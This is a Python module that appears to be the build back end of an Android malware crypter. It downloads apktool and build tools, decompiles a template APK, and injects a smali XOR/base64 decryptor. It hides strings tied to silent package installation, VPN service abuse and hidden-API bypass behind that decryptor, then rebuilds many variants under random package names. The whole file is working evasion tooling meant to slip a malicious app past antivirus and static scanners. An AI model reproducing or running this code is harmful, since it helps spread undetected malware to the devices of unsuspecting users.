"""Auto-download once + string-obfuscated + package-varied template variants."""
import os
import re
import shutil
import stat
import tarfile
import threading
import urllib.request
import zipfile
import subprocess
import random
import string
import base64
import hashlib

from config import (
    TOOLS_DIR, JAVA_BIN, APKTOOL_JAR, BT_DIR,
    APKSIGNER_BIN, ZIPALIGN_BIN, VARIANTS_DIR, TEMPLATE_APK,
    VARIANT_COUNT, STRING_XOR_KEY,
    URL_JRE, URL_APKTOOL, URL_BUILDTOOLS,
)

_READY_FLAG    = os.path.join(TOOLS_DIR, ".ready_v6")
_VARIANTS_FLAG = os.path.join(VARIANTS_DIR, ".built")

_setup_lock = threading.Lock()
_setup_done = threading.Event()
_setup_error = {"exc": None}


def _download(url, dest):
    if os.path.exists(dest) and os.path.getsize(dest) > 0:
        print(f"[i] {os.path.basename(dest)} present", flush=True)
        return
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    print(f"[*] downloading {os.path.basename(dest)}", flush=True)
    tmp = dest + ".part"
    urllib.request.urlretrieve(url, tmp)
    os.replace(tmp, dest)
    print(f"[✓] {os.path.basename(dest)} {os.path.getsize(dest)}", flush=True)


def _extract_jre():
    if os.path.exists(JAVA_BIN):
        return
    tgz = os.path.join(TOOLS_DIR, "jre.tgz")
    _download(URL_JRE, tgz)
    with tarfile.open(tgz) as t:
        try:
            t.extractall(TOOLS_DIR, filter="fully_trusted")
        except TypeError:
            t.extractall(TOOLS_DIR)
    picked = None
    for d in sorted(os.listdir(TOOLS_DIR)):
        full = os.path.join(TOOLS_DIR, d)
        if not os.path.isdir(full) or d == "jre":
            continue
        if ("jdk-" in d) or d.lower().startswith("jre"):
            if os.path.exists(os.path.join(full, "bin", "java")):
                picked = full
                break
    if not picked:
        raise RuntimeError("jre extract failed")
    target = os.path.join(TOOLS_DIR, "jre")
    if os.path.exists(target):
        shutil.rmtree(target)
    os.rename(picked, target)
    if os.path.exists(tgz):
        os.remove(tgz)


def _extract_build_tools():
    if os.path.exists(APKSIGNER_BIN):
        return
    zpath = os.path.join(TOOLS_DIR, "bt.zip")
    _download(URL_BUILDTOOLS, zpath)
    with zipfile.ZipFile(zpath) as z:
        z.extractall(TOOLS_DIR)
    picked = None
    for d in sorted(os.listdir(TOOLS_DIR)):
        full = os.path.join(TOOLS_DIR, d)
        if os.path.isdir(full) and d.startswith("android-"):
            if os.path.exists(os.path.join(full, "apksigner")):
                picked = full
                break
    if not picked:
        raise RuntimeError("bt extract failed")
    if os.path.exists(BT_DIR):
        shutil.rmtree(BT_DIR)
    os.rename(picked, BT_DIR)
    if os.path.exists(zpath):
        os.remove(zpath)
    for b in (APKSIGNER_BIN, ZIPALIGN_BIN, os.path.join(BT_DIR, "d8")):
        if os.path.exists(b):
            os.chmod(b, os.stat(b).st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)


def _rand_pkg():
    parts = []
    for _ in range(3):
        s = random.choice(string.ascii_lowercase)
        s += "".join(random.choices(string.ascii_lowercase + string.digits,
                                    k=random.randint(3, 7)))
        parts.append(s)
    return ".".join(parts)


def _apktool_d(apk, out):
    if os.path.exists(out):
        shutil.rmtree(out)
    subprocess.run(
        [JAVA_BIN, "-Xmx1g", "-jar", APKTOOL_JAR, "d", "-f",
         "-o", out, apk],
        check=True, capture_output=True, timeout=300,
    )


def _apktool_b(src, out):
    if os.path.exists(out):
        os.remove(out)
    subprocess.run(
        [JAVA_BIN, "-Xmx1g", "-jar", APKTOOL_JAR, "b",
         src, "-o", out],
        check=True, capture_output=True, timeout=300,
    )


# ---------- string obfuscation ----------

_SUSPICIOUS_PATTERNS = [
    "REQUEST_INSTALL_PACKAGES",
    "BIND_VPN_SERVICE",
    "android.net.VpnService",
    "com.android.system.qspaas",
    "VpnKillService",
    "RcvJbrzn",
    "PackageInstaller",
    "IPackageInstaller",
    "getPackageInstaller",
    "createSession",
    "openSession",
    "setHiddenApiExemptions",
    "dalvik.system.VMRuntime",
    "hiddenapi",
    "INSTALL_PACKAGES",
]


def _xor_str(s: str, key: str) -> bytes:
    b = s.encode("utf-8")
    k = key.encode("utf-8")
    out = bytearray(len(b))
    for i, x in enumerate(b):
        out[i] = x ^ k[i % len(k)]
    return bytes(out)


def _make_stringcrypto_smali(key: str) -> str:
    """Runtime decryptor: base64 → XOR → String. Java-free (pure smali)."""
    return """.class public LStringCrypto;
.super Ljava/lang/Object;
.source "SourceFile"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static d(Ljava/lang/String;)Ljava/lang/String;
    .registers 8
    const/4 v0, 0x0
    :try_start_0
    invoke-static {p0, v0}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
    move-result-object v1

    const-string v2, "%s"

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B
    move-result-object v2

    array-length v3, v2

    array-length v4, v1
    new-array v5, v4, [B

    const/4 v6, 0x0
    :goto_loop
    if-ge v6, v4, :goto_done
    aget-byte v7, v1, v6
    rem-int v0, v6, v3
    aget-byte v0, v2, v0
    xor-int/2addr v7, v0
    int-to-byte v7, v7
    aput-byte v7, v5, v6
    add-int/lit8 v6, v6, 0x1
    goto :goto_loop

    :goto_done
    new-instance v0, Ljava/lang/String;
    sget-object v6, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;
    invoke-direct {v0, v5, v6}, Ljava/lang/String;-><init>([BLjava/nio/charset/Charset;)V
    return-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    :catch_0
    return-object p0
.end method
""" % key


def _obfuscate_smali_strings(decompiled_dir: str):
    """Har smali file me suspicious strings ko encrypted form me badlo."""
    key = STRING_XOR_KEY
    helper_path = None
    for d in os.listdir(decompiled_dir):
        full = os.path.join(decompiled_dir, d)
        if not os.path.isdir(full):
            continue
        if d != "smali" and not d.startswith("smali_classes"):
            continue
        # StringCrypto class daalo
        helper_dir = os.path.join(full)
        hp = os.path.join(helper_dir, "StringCrypto.smali")
        with open(hp, "w", encoding="utf-8") as f:
            f.write(_make_stringcrypto_smali(key))
        helper_path = hp
        break

    if not helper_path:
        return

    pattern = re.compile(r'(\s+)const-string (v\d+|p\d+), "((?:[^"\\]|\\.)*)"')
    fixed = 0
    for d in os.listdir(decompiled_dir):
        full = os.path.join(decompiled_dir, d)
        if not os.path.isdir(full):
            continue
        if d != "smali" and not d.startswith("smali_classes"):
            continue
        for dirpath, _, files in os.walk(full):
            for fn in files:
                if not fn.endswith(".smali") or fn == "StringCrypto.smali":
                    continue
                fp = os.path.join(dirpath, fn)
                try:
                    with open(fp, "r", encoding="utf-8") as f:
                        txt = f.read()
                except Exception:
                    continue

                # check fast
                if not any(p in txt for p in _SUSPICIOUS_PATTERNS):
                    continue

                def _repl(m):
                    nonlocal fixed
                    indent, reg, s = m.group(1), m.group(2), m.group(3)
                    if any(p in s for p in _SUSPICIOUS_PATTERNS):
                        enc = base64.b64encode(_xor_str(s, key)).decode()
                        fixed += 1
                        return (f'{indent}const-string {reg}, "{enc}"\n'
                                f'{indent}invoke-static {{{reg}}}, LStringCrypto;->d(Ljava/lang/String;)Ljava/lang/String;\n'
                                f'{indent}move-result-object {reg}')
                    return m.group(0)

                new_txt = pattern.sub(_repl, txt)
                if new_txt != txt:
                    with open(fp, "w", encoding="utf-8") as f:
                        f.write(new_txt)

    print(f"[✓] string obfuscation: {fixed} strings encrypted", flush=True)


def _rename(decompiled, new_pkg):
    manifest = os.path.join(decompiled, "AndroidManifest.xml")
    with open(manifest, "r", encoding="utf-8") as f:
        mxml = f.read()
    m = re.search(r'package="([^"]+)"', mxml)
    if not m:
        raise RuntimeError("no pkg attr")
    old_pkg = m.group(1)
    old_path = old_pkg.replace(".", "/")
    new_path = new_pkg.replace(".", "/")

    mxml = mxml.replace(f'package="{old_pkg}"', f'package="{new_pkg}"')
    mxml = mxml.replace(f'android:name="{old_pkg}.', f'android:name="{new_pkg}.')
    mxml = mxml.replace(f'android:targetPackage="{old_pkg}"',
                        f'android:targetPackage="{new_pkg}"')
    with open(manifest, "w", encoding="utf-8") as f:
        f.write(mxml)

    for d in os.listdir(decompiled):
        full = os.path.join(decompiled, d)
        if not os.path.isdir(full):
            continue
        if d != "smali" and not d.startswith("smali_classes"):
            continue
        src = os.path.join(full, old_path)
        dst = os.path.join(full, new_path)
        if os.path.isdir(src):
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            if os.path.exists(dst):
                shutil.rmtree(dst)
            shutil.move(src, dst)

        old_ref = f"L{old_path}/"
        new_ref = f"L{new_path}/"
        for dirpath, _, files in os.walk(full):
            for fn in files:
                if not fn.endswith(".smali"):
                    continue
                fp = os.path.join(dirpath, fn)
                try:
                    with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                        txt = f.read()
                except Exception:
                    continue
                if old_ref in txt:
                    txt = txt.replace(old_ref, new_ref)
                    with open(fp, "w", encoding="utf-8") as f:
                        f.write(txt)

    yml = os.path.join(decompiled, "apktool.yml")
    if os.path.exists(yml):
        with open(yml, "r", encoding="utf-8", errors="ignore") as f:
            txt = f.read()
        txt = txt.replace(old_pkg, new_pkg)
        with open(yml, "w", encoding="utf-8") as f:
            f.write(txt)


def _build_variants():
    if os.path.exists(_VARIANTS_FLAG):
        return
    if not os.path.exists(TEMPLATE_APK):
        print("[!] template.apk missing", flush=True)
        return

    os.makedirs(VARIANTS_DIR, exist_ok=True)
    work = os.path.join(TOOLS_DIR, "_var_work")

    print(f"[*] {VARIANT_COUNT} variants + string obfuscation ...", flush=True)

    # pehla variant: full obfuscate + rename, phir usse copy + rename
    first = os.path.join(work, "v1")
    if os.path.exists(first):
        shutil.rmtree(first)

    _apktool_d(TEMPLATE_APK, first)
    _obfuscate_smali_strings(first)

    for i in range(1, VARIANT_COUNT + 1):
        try:
            d = os.path.join(work, f"v{i}")
            if i == 1:
                pass  # already decompiled + obfuscated
            else:
                if os.path.exists(d):
                    shutil.rmtree(d)
                shutil.copytree(first, d)

            new_pkg = _rand_pkg()
            _rename(d, new_pkg)
            out = os.path.join(VARIANTS_DIR, f"t{i}.apk")
            _apktool_b(d, out)
            print(f"[✓] v{i}: {new_pkg}", flush=True)
            shutil.rmtree(d, ignore_errors=True)
        except Exception as e:
            print(f"[!] v{i} failed: {e}", flush=True)

    shutil.rmtree(work, ignore_errors=True)
    with open(_VARIANTS_FLAG, "w") as f:
        f.write("ok")
    print("[✓] variants ready", flush=True)


def _do_setup():
    _extract_jre()
    _download(URL_APKTOOL, APKTOOL_JAR)
    _extract_build_tools()
    with open(_READY_FLAG, "w") as f:
        f.write("ok")
    print("[✓] tools ready", flush=True)


def _background_variants():
    try:
        _build_variants()
    except Exception as e:
        print(f"[!] variants failed: {e}", flush=True)


def ensure_tools():
    if os.path.exists(_READY_FLAG):
        _setup_done.set()
        if not os.path.exists(_VARIANTS_FLAG) and os.path.exists(TEMPLATE_APK):
            threading.Thread(target=_background_variants, daemon=True).start()
        return
    with _setup_lock:
        if os.path.exists(_READY_FLAG):
            _setup_done.set()
            return
        try:
            _do_setup()
            _setup_error["exc"] = None
        except Exception as e:
            _setup_error["exc"] = e
            raise
        finally:
            _setup_done.set()
    threading.Thread(target=_background_variants, daemon=True).start()


def wait_ready(timeout=900.0):
    if os.path.exists(_READY_FLAG):
        return True
    ok = _setup_done.wait(timeout)
    if _setup_error["exc"]:
        raise _setup_error["exc"]
    return ok and os.path.exists(_READY_FLAG)
